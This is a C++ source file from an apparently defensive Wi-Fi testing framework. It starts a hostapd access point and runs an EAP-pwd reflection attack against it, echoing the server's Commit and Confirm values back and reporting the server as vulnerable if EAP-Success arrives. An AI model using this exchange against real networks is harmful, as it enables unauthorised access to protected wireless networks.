#include <nlohmann/json.hpp>
#include <tins/hw_address.h>

#include "attacks/Enterprise/eap_defs.h"
#include "attacks/Enterprise/eap_helper.h"
#include "attacks/mc_mitm/MonitorSocket.h"
#include "config/RunStatus.h"
#include "logger/error_log.h"
#include "logger/log.h"
#include "setup/program.h"
#include "system/ip.h"
#include "system/utils.h"

using namespace std;
using namespace chrono;
using namespace filesystem;
using namespace Tins;

namespace wpa3_tester::reflection{


bool run_reflection_exchange(EAP_Att &eap_att){
	if(!do_auth(eap_att))  return false;
	if(!do_assoc(eap_att)) return false;

	// poll for an EAPOL frame satisfying pred, or EAP-Success (returned as empty vector).
	// returns nullopt on timeout or interrupt.

	// EAP-Identity
	{
		uint8_t eap_id = 0;
		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t>& e){ return is_identity_request(e, eap_id); });
		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
		//if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
		log(LogLevel::INFO, "EAP-Identity Request id={}", static_cast<int>(eap_id));
		send_eapol(eap_att, build_identity_response(eap_id, eap_att.identity));
	}

	// PWD-ID
	{
		optional<EapPwdFrame> frame;
		const auto eapol = wait_eapol(eap_att,[&](const vector<uint8_t>& e){
			const auto f = parse_eap_pwd(e);
			if(f && f->opcode == eap::PWD_OPCODE_ID){ frame = f; return true; }
			return false;
		});
		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
		//if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
		log(LogLevel::INFO, "EAP-PWD-ID Request");
		send_eapol(eap_att, build_pwd_id_response(*frame, eap_att.identity));
	}

	// COMMIT
	{
		optional<EapPwdFrame> frame;
		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t>& e){
			const auto f = parse_eap_pwd(e);
			if(f && f->opcode == eap::PWD_OPCODE_COMMIT){ frame = f; return true; }
			return false;
		});
		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
		//if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
		log(LogLevel::INFO, "EAP-PWD-Commit Request – reflecting scalar+element");
		send_eapol(eap_att, reflect_commit(*frame));
	}

	// CONFIRM
	{
		optional<EapPwdFrame> frame;
		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t>& e){
			const auto f = parse_eap_pwd(e);
			if(f && f->opcode == eap::PWD_OPCODE_CONFIRM){ frame = f; return true; }
			return false;
		});
		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
		//if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
		log(LogLevel::INFO, "EAP-PWD-Confirm Request – reflecting confirm value");
		send_eapol(eap_att, reflect_confirm(*frame));
	}

	// Wait for EAP-Success after confirm
	{
		const auto eapol = wait_eapol(eap_att, [](const vector<uint8_t>&){ return false; });
		if(eapol && eapol->empty()){
			log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!");
			return true;
		}
	}

	log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success");
	return false;
}

void setup_attack(RunStatus &rs){
	copy_f(rs.config_path().parent_path() / "config/hostapd.eap_user",
			  rs.run_folder() / "hostapd.eap_user");

	program::start(rs, "access_point");
	rs.process_manager.wait_for("access_point", "AP-ENABLED", chrono::seconds(40));
	log(LogLevel::INFO, "access_point running");
	ip::set_ip(rs, "access_point");

}

void run_attack(RunStatus &rs){
	rs.start_observers();
	const auto &att_cfg  = rs.config().at("attack_config");
	const auto attacker  = rs.get_actor("attacker");
	const auto ap_actor  = rs.get_actor("access_point");

	const string iface      = attacker.get(SK::iface);
	const string identity   = att_cfg.at("identity").get<string>();
	const string ssid       = ap_actor->get(SK::ssid);
	const Channel channel   = ap_actor->get_channel();

	const HWAddress<6> our_mac(attacker.get(SK::mac));
	const HWAddress<6> ap_mac(ap_actor.get(SK::mac));
    
	MonitorSocket sock(iface);
	EAP_Att eap_att{
		sock,
		channel,
		our_mac,
		ap_mac,
		ssid,
		identity,
		milliseconds{30000} // 30s
	};
	const bool vulnerable = run_reflection_exchange(eap_att);

	rs.save_result({{"passed", vulnerable}});
	log(LogLevel::INFO, "Reflection attack result: {}", vulnerable ? "VULNERABLE" : "not vulnerable");
}

}